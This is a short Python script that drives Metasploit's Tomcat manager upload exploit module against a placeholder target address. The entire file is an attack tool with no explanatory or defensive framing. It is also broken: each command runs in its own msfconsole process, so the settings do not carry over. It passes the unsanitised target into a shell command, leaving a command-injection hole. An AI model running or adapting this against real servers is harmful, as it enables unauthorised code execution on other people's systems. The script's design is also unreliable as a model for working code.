#!/usr/bin/env python3
import subprocess

def msf_exploit(target):
    exploits = [
        "use exploit/multi/http/tomcat_mgr_upload",
        f"set RHOSTS {target}",
        "exploit"
    ]
    for cmd in exploits:
        subprocess.run(f"msfconsole -q -x '{cmd}'", shell=True)

msf_exploit("10.10.10.x")
